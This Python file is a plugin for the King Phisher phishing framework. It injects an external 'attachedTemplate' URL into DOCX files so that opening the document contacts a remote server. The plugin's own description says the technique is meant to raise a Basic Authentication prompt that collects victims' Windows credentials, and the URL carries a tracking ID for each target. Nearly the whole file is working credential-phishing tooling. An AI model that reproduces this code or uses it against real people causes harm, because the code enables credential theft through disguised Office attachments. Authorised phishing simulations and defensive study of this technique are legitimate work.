import argparse
import os
import random
import shutil
import tempfile
import zipfile

import king_phisher.client.plugins as plugins

PARSER_EPILOG = """\
If no output file is specified, the input file will be modified in place.
"""

def patch_zip_file(zin, zout, patches):
	zout.comment = zin.comment
	for item in zin.infolist():
		data = zin.read(item.filename)
		if item.filename in patches:
			data = patches.pop(item.filename)
			if data is None:
				continue
		zout.writestr(item, data)
	for filename, data in patches.items():
		zout.writestr(filename, data)

def phishery_inject(input_file, https_url, output_file=None):
	input_file = os.path.abspath(input_file)
	output_file = os.path.abspath(output_file or input_file)
	if input_file == output_file:
		tmpfd, output_file = tempfile.mkstemp(dir=os.path.dirname(input_file), suffix=os.path.splitext(input_file)[1])
		os.close(tmpfd)
		output_is_temp = True
	else:
		output_is_temp = False

	rid = 'rId' + str(random.randint(10000, 99999))
	settings = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\r\n'
	settings += '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
	settings += '<Relationship Id="{rid}" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="{target_url}" TargetMode="External"/>'
	settings += '</Relationships>'
	settings = settings.format(rid=rid, target_url=https_url)

	patches = {
		'word/_rels/settings.xml.rels': settings
	}
	with zipfile.ZipFile(input_file, 'r') as zin:
		settings = zin.read('word/settings.xml')
		settings = settings.decode('utf-8')
		settings = settings.replace('/><w', "/><w:attachedTemplate r:id=\"{0}\"/><w".format(rid), 1)
		patches['word/settings.xml'] = settings
		with zipfile.ZipFile(output_file, 'w') as zout:
			patch_zip_file(zin, zout, patches=patches)

	if output_is_temp:
		shutil.copyfile(output_file, input_file)
		os.unlink(output_file)

class Plugin(getattr(plugins, 'ClientPluginMailerAttachment', plugins.ClientPlugin)):
	authors = ['Ryan Hanson', 'Spencer McIntyre']
	title = 'Phishery DOCX URL Injector'
	description = """
	Use Phishery to inject Word Document Template URLs into DOCX files. This can
	be used in conjunction with a server page that requires Basic Authentication
	to collect Windows credentials. Note that the King Phisher server needs to
	be configured with a proper, trusted SSL certificate for the user to be
	presented with the basic authentication prompt.

	Phishery homepage: https://github.com/ryhanson/phishery
	"""
	homepage = 'https://github.com/securestate/king-phisher-plugins'
	req_min_version = '1.8.0b0'
	version = '2.0'
	def initialize(self):
		mailer_tab = self.application.main_tabs['mailer']
		self.text_insert = mailer_tab.tabs['send_messages'].text_insert
		return True

	def process_attachment_file(self, input_path, output_path, target=None):
		if os.path.splitext(input_path)[1] != '.docx':
			return
		url = self.application.config['mailer.webserver_url']
		if target is not None:
			url += '?id=' + target.uid

		phishery_inject(input_path, url, output_file=output_path)
		self.logger.info('wrote docx file to: ' + output_path + ('' if target is None else ' with uid: ' + target.uid))

def main():
	parser = argparse.ArgumentParser(description='Phishery DOCX URL Injector Utility', conflict_handler='resolve')
	parser.add_argument('-i', '--input', dest='input_file', required=True, help='the input file to inject into')
	parser.add_argument('-o', '--output', dest='output_file', help='the output file to write')
	parser.add_argument('-u', '--url', dest='target_url', required=True, help='the target url to inject into the input file')
	parser.epilog = PARSER_EPILOG
	arguments = parser.parse_args()

	phishery_inject(arguments.input_file, arguments.target_url, output_file=arguments.output_file)

if __name__ == '__main__':
	main()
